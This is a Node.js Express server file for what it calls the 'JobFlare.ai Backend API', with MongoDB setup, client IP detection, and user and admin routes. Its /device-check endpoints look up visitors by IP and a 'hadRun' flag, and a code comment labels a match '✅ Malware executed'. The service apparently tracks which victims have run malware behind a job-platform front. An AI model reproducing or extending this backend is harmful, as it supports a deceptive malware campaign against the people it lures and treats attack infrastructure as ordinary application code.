import express from 'express';
import mongoose from 'mongoose';
import cors from 'cors';
import dotenv from 'dotenv';
import morgan from 'morgan';

// Import routes
import userRoutes from './routes/userRoutes.js';
import adminRoutes from './routes/adminRoutes.js';
import User from './models/User.js';

// Load environment variables
dotenv.config();

const app = express();

// Trust proxy for accurate IP detection (when behind load balancer/reverse proxy)
app.set('trust proxy', true);

// Middleware
app.use(cors({
  origin: process.env.CLIENT_URL || 'http://localhost:3000',
  credentials: true
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(morgan('dev'));

// Database Connection
const connectDB = async () => {
  try {
    await mongoose.connect(process.env.MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    });
    console.log('✅ MongoDB Connected Successfully');
  } catch (error) {
    console.error('❌ MongoDB Connection Error:', error.message);
    process.exit(1);
  }
};

connectDB();

// Helper function to get client IP
const getClientIp = (reqIp, req) => {
  // Check various headers for the real client IP
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  const realIp = req.headers['x-real-ip'];
  if (realIp) {
    return realIp;
  }
  // Fallback to req.ip (which handles ::ffff: prefix for IPv4)
  let ip = reqIp || req.connection?.remoteAddress || req.socket?.remoteAddress;
  // Remove IPv6 prefix for IPv4 addresses
  if (ip && ip.startsWith('::ffff:')) {
    ip = ip.substring(7);
  }
  return ip;
};

// Normalize localhost IPs to a common format
const normalizeLocalhostIp = (ip) => {
  const localhostVariants = ['127.0.0.1', '::1', 'localhost', '::ffff:127.0.0.1'];
  if (localhostVariants.includes(ip)) {
    return '127.0.0.1';
  }
  return ip;
};

// Get all possible IP variants for localhost
const getIpVariants = (ip) => {
  const normalized = normalizeLocalhostIp(ip);
  if (normalized === '127.0.0.1') {
    return ['127.0.0.1', '::1', 'localhost', '::ffff:127.0.0.1'];
  }
  return [ip];
};

// Routes
app.get('/', (req, res) => {
  res.json({
    message: 'JobFlare.ai Backend API',
    version: '1.0.0',
    endpoints: {
      users: '/api/users',
      admin: '/api/admin'
    }
  });
});

// Device check endpoint - checks if user with this IP has hadRun = true
app.post('/device-check', async (req, res) => {
  console.log('Device check request received');
  const clientIp = getClientIp(req.ip, req);
  const ipVariants = getIpVariants(clientIp);
  console.log('Client IP:', clientIp);
  console.log('Checking IP variants:', ipVariants);
  
  try {
    // Find user by any IP variant (handles localhost differences)
    const found = await User.findOne({ 
      'deviceInfo.ip': { $in: ipVariants },
      hadRun: true 
    });
    
    if (found) {
      console.log('Device check: hadRun = true for user:', found.email, 'IP:', found.deviceInfo?.ip);
      res.json({ success: true, result: true }); // ✅ Malware executed
    } else {
      console.log('Device check: No user with hadRun=true found for IPs:', ipVariants);
      res.json({ success: true, result: false }); // ❌ Not yet
    }
  } catch (err) {
    console.error('Error checking IP in DB:', err);
    res.status(500).json({ success: false, error: 'Database error' });
  }
});

// Device check by specific IP (for admin use)
app.post('/device-check/:ip', async (req, res) => {
  const targetIp = req.params.ip;
  console.log('Device check for specific IP:', targetIp);
  
  try {
    const found = await User.findOne({ 'deviceInfo.ip': targetIp });
    
    if (found !== null && found.hadRun) {
      res.json({ success: true, result: true, hadRun: true });
    } else {
      res.json({ success: true, result: false, hadRun: found?.hadRun || false });
    }
  } catch (err) {
    console.error('Error checking IP in DB:', err);
    res.status(500).json({ success: false, error: 'Database error' });
  }
});

app.use('/api/users', userRoutes);
app.use('/api/admin', adminRoutes);

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(err.status || 500).json({
    success: false,
    message: err.message || 'Internal Server Error',
    ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: 'Route not found'
  });
});

const PORT = process.env.PORT || 5000;

if (process.env.NODE_ENV !== 'production') {
  app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 Environment: ${process.env.NODE_ENV}`);
    console.log(`🌐 API URL: http://localhost:${PORT}`);
  });
}

export default app;
